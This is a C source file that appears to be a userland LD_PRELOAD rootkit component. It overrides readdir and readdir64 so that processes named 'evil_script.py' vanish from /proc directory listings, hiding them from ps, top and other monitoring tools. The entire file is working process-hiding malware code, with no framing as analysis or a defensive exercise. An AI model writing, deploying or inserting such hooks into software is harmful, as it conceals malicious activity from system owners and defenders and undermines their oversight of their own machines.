#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <regex.h>
#include <stdlib.h>


int regex_match(const char *pattern, const char *text)
{
    regex_t regex;
    int status;
    // Compile the regular expression pattern
    status = regcomp(&regex, pattern, REG_EXTENDED);

    if (status != 0)
    {
        char errbuf[1024];
        regerror(status, &regex, errbuf, sizeof(errbuf));
        // fprintf(stderr, "Could not compile regex: %s\n", errbuf);
        regfree(&regex);
        return 0; // Return false on error
    }
    // Execute the regex match against the text
    status = regexec(&regex, text, 0, NULL, 0);
    regfree(&regex); // Free memory allocated to regex
    // Check if there was a match
    return (status == 0); // Returns true (1) if there was a match, false (0) otherwise
}

/*
 * Every process with this name will be excluded
 */

static const char *process_to_filter = "^evil_script\\.py$";

/*
 * Get a directory name given a DIR* handle
 */
static int get_dir_name(DIR *dirp, char *buf, size_t size)
{
    int fd = dirfd(dirp);
    if (fd == -1)
    {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if (ret == -1)
    {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}

/*
 * Get a process name given its pid
 */
static int get_process_name(char *pid, char *buf)
{
    if (strspn(pid, "0123456789") != strlen(pid))
    {
        return 0;
    }

    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);

    FILE *f = fopen(tmp, "r");
    if (f == NULL)
    {
        return 0;
    }

    if (fgets(tmp, sizeof(tmp), f) == NULL)
    {
        fclose(f);
        return 0;
    }

    fclose(f);

    int unused;
    sscanf(tmp, "%d (%[^)]s", &unused, buf);
    return 1;
}

#define DECLARE_READDIR(dirent, readdir)                              \
    static struct dirent *(*original_##readdir)(DIR *) = NULL;        \
                                                                      \
    struct dirent *readdir(DIR *dirp)                                 \
    {                                                                 \
        if (original_##readdir == NULL)                               \
        {                                                             \
            original_##readdir = dlsym(RTLD_NEXT, #readdir);          \
            if (original_##readdir == NULL)                           \
            {                                                         \
                fprintf(stderr, "Error in dlsym: %s\n", dlerror());   \
            }                                                         \
        }                                                             \
                                                                      \
        struct dirent *dir;                                           \
                                                                      \
        while (1)                                                     \
        {                                                             \
            dir = original_##readdir(dirp);                           \
            if (dir)                                                  \
            {                                                         \
                char dir_name[256];                                   \
                char process_name[256];                               \
                if (get_dir_name(dirp, dir_name, sizeof(dir_name)) && \
                    strcmp(dir_name, "/proc") == 0 &&                 \
                    get_process_name(dir->d_name, process_name) &&    \
                    regex_match(process_to_filter, process_name))                                          \
                {                                                     \
                    continue;                                         \
                }                                                     \
            }                                                         \
            break;                                                    \
        }                                                             \
        return dir;                                                   \
    }

DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);
